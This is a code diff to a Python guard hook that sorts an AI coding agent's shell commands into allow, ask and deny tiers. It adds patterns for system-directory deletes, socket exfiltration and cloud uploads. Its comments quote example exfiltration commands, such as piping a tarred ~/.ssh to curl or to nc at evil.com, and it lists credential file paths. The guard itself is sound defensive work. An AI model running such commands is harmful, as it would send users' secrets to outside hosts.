@@ -45,7 +45,7 @@ import time
 from pathlib import Path
 from typing import Optional
 
-from .plan import clawness_dir, find_project_root, is_plan_file  # noqa: F401  (find_project_root re-exported for the hook)
+from .plan import atomic_write_text, clawness_dir, find_project_root, is_plan_file  # noqa: F401  (find_project_root re-exported for the hook)
 
 WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}
 
@@ -135,7 +135,10 @@ _RM_CATASTROPHIC_RE = re.compile(
     | {_HOME_PREFIX} (?: [\\/]\*? | [\\/]\.[\w.-]+[\\/]? )? (?=\s|$|[;|&"'])
                                        # home root, home/* or a top-level dotdir (~/.ssh)
     | %SYSTEMROOT%
-    | /(etc|usr|var|bin|sbin|lib|lib64|root|boot|sys|opt)(?=/|\s|$)
+    | /(etc|usr|var|bin|sbin|lib|lib64|root|boot|sys|opt)(?:/|/\*)?(?=\s|$)
+                                       # the system dir ITSELF (/var, /var/, /var/*)
+                                       # — a delete DEEPER under it (/var/cache/x)
+                                       # is a fixable mistake, handled at ASK tier
     | /home (?=/?\s|/?$)               # /home itself (per-user roots via the prefix)
     | /Users (?=/?\s|/?$)
     | [A-Za-z]:[\\/]+ (?=\s|$|\*)      # a drive root (C:\), not deeper Windows paths
@@ -150,6 +153,17 @@ _RM_HOME_TOPDIR_RE = re.compile(
     \brm\b (?=[^\n;|&]*\B-\w*r)
     [^\n;|&]*? \s ["']?
     {_HOME_PREFIX} [\\/] [\w.-]+ [\\/]? (?=\s|$|[;|&"'])
+    """
+)
+# Recursive delete of a path UNDER a system directory (`rm -rf /var/cache/app`,
+# `rm -rf /opt/oldtool`) — routine devops/container cleanup, but destructive
+# enough to confirm. The system dir ITSELF is a hard DENY above; only deeper
+# paths reach here, so this is an ASK, not a block.
+_RM_SYSTEM_SUBDIR_RE = re.compile(
+    r"""(?ix)
+    \brm\b (?=[^\n;|&]*\B-\w*r)
+    [^\n;|&]*? \s ["']?
+    /(?:etc|usr|var|bin|sbin|lib|lib64|root|boot|sys|opt)/[\w.\-/]+
     """
 )
 # Windows-native catastrophic delete: Remove-Item (the full cmdlet name — its
@@ -222,7 +236,10 @@ _REMOTE_COPY_RE = re.compile(r"(?i)\b(scp|rsync|sftp)\b")
 # too) so `tar czf - ~/.ssh | curl ...` matches — the old `[\\/]\.ssh[\\/]`
 # needed a slash on both sides and missed a bare directory reference like that.
 _CRED_REF_RE = re.compile(
-    r"(?i)(\.env\b|[\\/]\.ssh(?:[\\/]|\b)|[\\/]\.aws(?:[\\/]|\b)|[\\/]\.gnupg(?:[\\/]|\b)|"
+    # `.env` but NOT a committed template (`.env.example`, `.env.sample`, …) —
+    # fetching or copying a template is routine and must not trip the cred DENY.
+    r"(?i)(\.env\b(?!\.(?:example|sample|template|dist|defaults?)\b)|"
+    r"[\\/]\.ssh(?:[\\/]|\b)|[\\/]\.aws(?:[\\/]|\b)|[\\/]\.gnupg(?:[\\/]|\b)|"
     r"\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.pem\b|\.p12\b|\.pfx\b|\.jks\b|"
     r"\.npmrc\b|\.git-credentials\b|\.pgpass\b|\.netrc\b|\.pypirc\b|\.aws[\\/]credentials|"
     r"[\\/]\.kube[\\/]config\b|[\\/]\.docker[\\/]config\.json\b|[\\/]\.config[\\/]gh\b|"
@@ -245,10 +262,18 @@ _BASH_READER_RE = re.compile(
 )
 # Command substitution / inline capture — turns a GET into an exfil channel
 # (`curl https://x/?d=$(cat secret)`), unlike a plain parameterised API call.
-# The bare-token-var branch (`$GITHUB_TOKEN`, unlike `${...}`) routes a command
-# embedding a token/key/secret env var through the same provenance handling —
-# NOT the DENY-tier _CRED_REF_RE, since that would hard-block routine
-# `curl -H "Authorization: Bearer $GITHUB_TOKEN" ...` calls.
+# Two disjoint shapes, because they carry very different risk:
+#   _INLINE_CAPTURE_RE — `$(...)`, backtick, `<(...)` actually RUN a command and
+#     embed its output; combined with a data upload to an absent host this is the
+#     exfil signature → DENY-tier.
+#   _VAR_EXPANSION_RE — `${VAR}` parameter expansion and a bare token/key/secret
+#     env var (`$GITHUB_TOKEN`). This is routine authentication
+#     (`curl -H "Authorization: Bearer $GITHUB_TOKEN" ...`) and must NOT hard-block
+#     — it only ever routes to ASK.
+# _CMD_SUBST_RE is their union, used where any substitution shape is enough to
+# treat a call as suspicious (the has_subst gate).
+_INLINE_CAPTURE_RE = re.compile(r"\$\(|`|<\(")
+_VAR_EXPANSION_RE = re.compile(r"\$\{[A-Za-z_]|(?i:\$\w*_(?:TOKEN|KEY|SECRET)\b)")
 _CMD_SUBST_RE = re.compile(
     r"\$\(|\$\{[A-Za-z_]|`|<\(|(?i:\$\w*_(?:TOKEN|KEY|SECRET)\b)"
 )
@@ -284,6 +309,94 @@ _URL_HOST_RE = re.compile(r"https?://([^/\s'\"`]+)")
 # scp/ssh destination — REQUIRE the user@host: form so we don't mistake a URL
 # scheme ("https:") for a host. Plain URLs are handled by _URL_HOST_RE.
 _SCP_HOST_RE = re.compile(r"(?:^|[\s'\"])[A-Za-z0-9._-]+@([A-Za-z0-9.-]+):")
+
+# Data piped into a raw network socket (`tar … | nc evil.com 4444`) or fed to one
+# via input redirection (`nc host 80 < dump`). These carry no curl-style -d flag
+# and no parseable URL host, so the provenance tier below never sees them — flag
+# the shape directly. A bare `nc -z host port` health check (no pipe, no redirect)
+# is left silent.
+_DATA_TO_SOCKET_RE = re.compile(
+    r"(?i)(?:"
+    r"\|\s*(?:sudo\s+)?(?:nc|ncat|netcat|telnet|ftp)\b"   # something | nc host
+    r"|\b(?:nc|ncat|netcat)\b[^\n|;&]*<\s*[^\s<]"          # nc host < file
+    r")"
+)
+
+# Cloud-storage CLI uploads (a bucket/blob as the DESTINATION): aws s3 cp/sync/mv,
+# gsutil cp/rsync/mv, az storage blob upload. Provenance-tiered like curl egress —
+# a bucket the repo already references (IaC/config) is the routine deploy path and
+# stays silent; an unrecognized bucket asks once. Downloads (cloud → local) are not
+# an egress shape and are never flagged.
+_CLOUD_UPLOAD_RE = re.compile(
+    r"(?ix)\b(?:"
+    r"aws\s+s3\s+(?:cp|sync|mv)"
+    r"|gsutil\s+(?:-\S+\s+)*(?:cp|rsync|mv)"
+    r"|az\s+storage\s+blob\s+upload(?:-batch)?"
+    r")\b"
+)
+_CLOUD_URI_RE = re.compile(r"(?:s3|gs)://[A-Za-z0-9][A-Za-z0-9._-]*(?:/\S*)?")
+
+
+def _bucket_uri(uri: str) -> str:
+    """`s3://bucket/key/…` → `s3://bucket` (the identity we dedup/report on)."""
+    m = re.match(r"((?:s3|gs)://[^/\s]+)", uri)
+    return m.group(1) if m else uri
+
+
+def _bucket_name(uri: str) -> str:
+    """`s3://bucket/key` → `bucket` (what to search the project corpus for)."""
+    return _bucket_uri(uri).split("://", 1)[-1]
+
+
+def _cloud_upload_targets(cmd: str) -> list[str]:
+    """Destination buckets/containers of a cloud-storage UPLOAD, or [] if the
+    command isn't an upload. Upload = a local source precedes a cloud URI
+    (`cp ./dist s3://bucket`); a download has the cloud URI first."""
+    m = _CLOUD_UPLOAD_RE.search(cmd)
+    if not m:
+        return []
+    if re.search(r"(?i)\baz\s+storage\s+blob\s+upload", cmd):
+        cont = re.search(r"(?i)(?:-c|--container(?:-name)?)\s+(\S+)", cmd)
+        return ["az-blob:" + (cont.group(1) if cont else "?")]
+    targets: list[str] = []
+    seen_local = False
+    for tok in cmd[m.end():].split():
+        if tok.startswith("-"):
+            continue
+        if _CLOUD_URI_RE.match(tok):
+            if seen_local:                 # local → cloud = upload
+                targets.append(_bucket_uri(tok))
+        else:
+            seen_local = True
+    return targets
+
+
+def _egress_targets(cmd: str) -> list[str]:
+    """The external destinations a flagged Bash command would prompt about — used
+    to dedup the ask by TARGET, not by exact command text, so iterating payloads
+    to the same host/bucket asks only once. Empty when the command isn't an
+    egress-ask shape (callers fall back to the full command as the key)."""
+    targets: list[str] = []
+    ext_hosts = _external_hosts(cmd)
+    data_bearing = bool(_DATA_NETWORK_RE.search(cmd) or _REMOTE_COPY_RE.search(cmd))
+    has_subst = bool(_NETWORK_RE.search(cmd) and _CMD_SUBST_RE.search(cmd))
+    if ext_hosts and (data_bearing or has_subst):
+        targets += ext_hosts
+    targets += _cloud_upload_targets(cmd)
+    return targets
+
+
+def _cred_refs_only_in_urls(cmd: str) -> bool:
+    """True if every credential-shaped token in the command sits inside an http(s)
+    URL — i.e. it's a REMOTE path being fetched (`curl -O https://host/config.env`),
+    not a local secret file being read or uploaded. Lets a plain download of a
+    credential-named URL drop from the cred+network DENY to an ASK."""
+    url_spans = [mm.span() for mm in re.finditer(r"https?://\S+", cmd)]
+    for m in _CRED_REF_RE.finditer(cmd):
+        s, e = m.span()
+        if not any(us <= s and e <= ue for us, ue in url_spans):
+            return False
+    return True
 
 
 # --- reasons (shown to the user in the permission dialog) -----------------
@@ -422,12 +535,7 @@ def _load_provenance_cache(root: Path) -> dict:
 
 
 def _save_provenance_cache(root: Path, cache: dict) -> None:
-    d = clawness_dir(root)
-    try:
-        d.mkdir(parents=True, exist_ok=True)
-        _provenance_cache_path(root).write_text(json.dumps(cache, indent=2) + "\n", encoding="utf-8")
-    except OSError:
-        pass
+    atomic_write_text(_provenance_cache_path(root), json.dumps(cache, indent=2) + "\n")
 
 
 def value_in_project_cached(value: str, root: Path) -> Optional[bool]:
@@ -537,6 +645,16 @@ def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
     if _RM_CATASTROPHIC_RE.search(cmd) or _RM_CATASTROPHIC_WIN_RE.search(cmd):
         return (DENY, _deny("it recursively deletes a filesystem root, home, or system directory"))
     if _NETWORK_RE.search(cmd) and _CRED_REF_RE.search(cmd):
+        # A DOWNLOAD of a credential-NAMED URL (`curl -O https://host/config.env`)
+        # isn't reading or sending a local secret — the token is part of the remote
+        # path. Drop that to ASK; anything that reads/uploads a local secret file
+        # (the cred token appears outside any URL, or the command is data-bearing)
+        # stays a hard DENY.
+        data_bearing = bool(_DATA_NETWORK_RE.search(cmd) or _REMOTE_COPY_RE.search(cmd))
+        if not data_bearing and _cred_refs_only_in_urls(cmd):
+            return (ASK, _ask(
+                "fetching a credential-named file from the network — confirm it's a "
+                "template/example, not a real secret"))
         return (DENY, _deny("it references a credential/secret file in a command that also touches the network"))
 
     # --- dual-use: dangerous but routinely legitimate → ask (approvable) ---
@@ -545,6 +663,8 @@ def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
     # the guard, so surface an approve prompt instead.
     if _RM_HOME_TOPDIR_RE.search(cmd):
         return (ASK, _ask("recursively deleting an entire top-level directory in the home folder"))
+    if _RM_SYSTEM_SUBDIR_RE.search(cmd):
+        return (ASK, _ask("recursively deleting a path under a system directory (/etc, /var, /opt, /usr, …)"))
     if _PIPE_TO_SHELL_RE.search(cmd):
         return (ASK, _ask("running a script piped straight from the network into a shell — fine for a trusted installer, risky otherwise"))
     if ((_SHELL_EXEC_RE.search(cmd) and _NET_FETCH_TOKEN_RE.search(cmd) and _SUBST_OR_PROC_RE.search(cmd))
@@ -558,6 +678,8 @@ def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
         return (ASK, _ask("pipes environment variables into a network command — may leak secrets stored in env vars"))
     if _WIN_DOWNLOAD_CRADLE_RE.search(cmd):
         return (ASK, _ask("downloads and can execute content via a Windows LOLBin (WebClient/certutil/bitsadmin/encoded command) — same risk as curl | sh"))
+    if _DATA_TO_SOCKET_RE.search(cmd):
+        return (ASK, _ask("piping data into a raw network socket (nc/telnet/ftp) — a potential exfiltration channel with no destination to verify"))
 
     # Reading a credential store OUTSIDE the project (e.g. cat ~/.ssh/id_rsa) — the
     # Read-tool gate is bypassable via Bash, so cover it here. In-project secret
@@ -576,21 +698,36 @@ def _classify_bash(tool_input: dict, root: Path) -> tuple[str, str]:
         verdicts = [value_in_project_cached(h, root) for h in ext_hosts]
         if False in verdicts:
             unknown = ", ".join(h for h, v in zip(ext_hosts, verdicts) if v is False)
-            # Absent-host + data-bearing is suspicious either way, but only a hard
-            # DENY when a secret/credential signal is also in the command — plain
-            # data upload to a host given inline (CLI arg, chat) rather than
-            # written into a file is legitimate and shouldn't be unoverridable.
-            secret_signal = bool(_CRED_REF_RE.search(cmd) or _CMD_SUBST_RE.search(cmd))
-            if data_bearing and secret_signal:
+            # Absent-host + data-bearing is suspicious either way, but a hard DENY
+            # is reserved for INLINE CAPTURE ($(...)/backtick/<()) — dynamically
+            # embedding a command's output into the upload is the exfil signature.
+            # A plain token env var ($API_TOKEN) or ${VAR} is routine auth and only
+            # ASKs, so an everyday POST to an internal host whose name lives in a
+            # secret manager (not committed) stays overridable.
+            if data_bearing and _INLINE_CAPTURE_RE.search(cmd):
                 return (DENY, _deny(
-                    f"it sends data to a host that appears nowhere in this codebase ({unknown}) — "
-                    "the signature of data exfiltration"))
+                    f"it embeds captured command output in an upload to a host that appears "
+                    f"nowhere in this codebase ({unknown}) — the signature of data exfiltration"))
             if data_bearing:
                 return (ASK, _ask(
                     f"uploading data to a host that appears nowhere in this codebase ({unknown})"))
             return (ASK, _ask(
                 f"a network call to an unrecognized host ({unknown}) with shell substitution embedded"))
         return (ASK, _ask(f"a network upload to {', '.join(ext_hosts)} (a known/unverified destination)"))
+
+    # --- cloud-storage upload (aws s3 / gsutil / az blob) — provenance-tiered ---
+    # A bucket the repo already names (Terraform, CI config, source) is the routine
+    # deploy path → allow silently. An unrecognized bucket asks once (per bucket).
+    # No DENY tier: a mistyped or unknown bucket is a scope question, not an attack
+    # signature, and cloud CLIs are how enterprises ship artifacts.
+    cloud = _cloud_upload_targets(cmd)
+    if cloud:
+        verdicts = [value_in_project_cached(_bucket_name(c), root) for c in cloud]
+        if all(v is True for v in verdicts):
+            return (ALLOW, "")
+        absent = ", ".join(c for c, v in zip(cloud, verdicts) if v is not True)
+        return (ASK, _ask(
+            f"uploading to cloud storage not referenced in this codebase ({absent})"))
 
     # --- package install (lifecycle scripts run arbitrary code) ---
     if (_PKG_INSTALL_RE.search(cmd)
@@ -624,14 +761,24 @@ def classify_tool_call(
 
 def dedup_key(tool_name: str, tool_input: "dict | None") -> str:
     """A stable key identifying *what* a flagged call targets, so the hook can
-    avoid re-prompting for the identical target within one session."""
+    avoid re-prompting for the identical target within one session.
+
+    For network egress the key is the DESTINATION (host/bucket), not the exact
+    command — so iterating upload payloads to the same host asks only once, which
+    is what "asks once per target/session" is supposed to mean. Every other tier
+    (writes, reads, package installs, force-push, …) keys on the concrete path or
+    full command, where each distinct target genuinely deserves its own prompt."""
     tool_input = tool_input or {}
     if tool_name in WRITE_TOOLS:
         return str(tool_input.get("file_path") or tool_input.get("notebook_path") or "")
     if tool_name == "Read":
         return str(tool_input.get("file_path") or "")
     if tool_name == "Bash":
-        return str(tool_input.get("command") or "")
+        cmd = str(tool_input.get("command") or "")
+        targets = _egress_targets(cmd)
+        if targets:
+            return "egress:" + ",".join(sorted(set(targets)))
+        return cmd
     return ""
 
 
@@ -687,12 +834,7 @@ def _load_ledger(root: Path) -> dict:
 
 
 def _save_ledger(root: Path, ledger: dict) -> None:
-    d = clawness_dir(root)
-    try:
-        d.mkdir(parents=True, exist_ok=True)
-        _guard_ledger_path(root).write_text(json.dumps(ledger, indent=2) + "\n", encoding="utf-8")
-    except OSError:
-        pass
+    atomic_write_text(_guard_ledger_path(root), json.dumps(ledger, indent=2) + "\n")
 
 
 def already_asked(root: Path, session_id: str, key: str) -> bool:
